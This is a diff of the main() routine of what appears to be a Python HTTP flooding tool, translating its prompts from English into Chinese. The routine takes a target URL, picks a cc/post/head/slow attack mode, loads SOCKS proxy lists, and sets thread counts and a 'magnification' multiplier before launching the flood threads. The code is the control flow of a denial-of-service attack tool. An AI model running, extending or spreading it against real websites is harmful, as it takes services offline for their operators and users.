@@ -652,19 +652,19 @@ def main():
 	global brute
 	global url
 	print("> Mode: [cc/post/head/slow/check]")
-	mode = InputOption("> Choose Your Mode (default=cc) :",["cc","post","head","slow","check"],"cc")
-	url = str(input("> Input the target url:")).strip()
+	mode = InputOption("> 选择你的模式 (default=cc) :",["cc","post","head","slow","check"],"cc")
+	url = str(input("> 输入目标网址:")).strip()
 	prevent()
 	ParseUrl(url)
 	if mode == "post":
-		mode2 = InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
+		mode2 = InputOption("> 自定义post数据? (y/n, default=n):",["y","n","yes","no"],"n")
 		if mode2 == "y":
-			data = open(str(input("> Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
+			data = open(str(input("> 输入文件的路径:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
 			data = ' '.join([str(txt) for txt in data])
-	choice2 = InputOption("> Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
+	choice2 = InputOption("> 自定义cookie? (y/n, default=n):",["y","n","yes","no"],"n")
 	if choice2 == "y":
-		cookies = str(input("Plese input the cookies:")).strip()
-	choice = InputOption("> Choose your socks mode(4/5, default=5):",["4","5"],"5")
+		cookies = str(input("请输入cookie:")).strip()
+	choice = InputOption("> 选择你的socks模式(4/5, default=5):",["4","5"],"5")
 	if choice == "4":
 		socks_type = 4
 	else:
@@ -674,9 +674,9 @@ def main():
 		print("> End of process")
 		return
 	if mode == "slow":	
-		thread_num = str(input("> Connections(default=400):"))
+		thread_num = str(input("> 连接数(default=400):"))
 	else:
-		thread_num = str(input("> Threads(default=400):"))
+		thread_num = str(input("> 线程(default=400):"))
 	if thread_num == "":
 		thread_num = int(400)
 	else:
@@ -686,21 +686,21 @@ def main():
 			sys.exit("Error thread number")
 	CheckerOption()
 	if len(proxies) == 0:
-		print("> There are no more proxies. Please download a new one.")
+		print("> 不再有代理了。请下载一个新的。")
 		return
 	ind_rlock = threading.RLock()
 	if mode == "slow":
-		input("Press Enter to continue.")
+		input("按回车键继续。")
 		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
 		th.setDaemon(True)
 		th.start()
 	else:
-		multiple = str(input("> Input the Magnification(default=100):"))
+		multiple = str(input("> 输入放大倍率(default=100):"))
 		if multiple == "":
 			multiple = int(100)
 		else:
 			multiple = int(multiple)
-		brute = str(input("> Enable boost mode[beta](y/n, default=n):"))
+		brute = str(input("> 启用提升模式[beta](y/n, default=n):"))
 		if brute == "":
 			brute = False
 		elif brute == "y":
@@ -708,11 +708,11 @@ def main():
 		elif brute == "n":
 			brute = False
 		event = threading.Event()
-		print("> Building threads...")
+		print("> 构建线程...")
 		SetupIndDict()
 		build_threads(mode,thread_num,event,socks_type,ind_rlock)
 		event.clear()
-		input("Press Enter to continue.")
+		input("按回车键继续。")
 		event.set()
 		threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
 	while True:
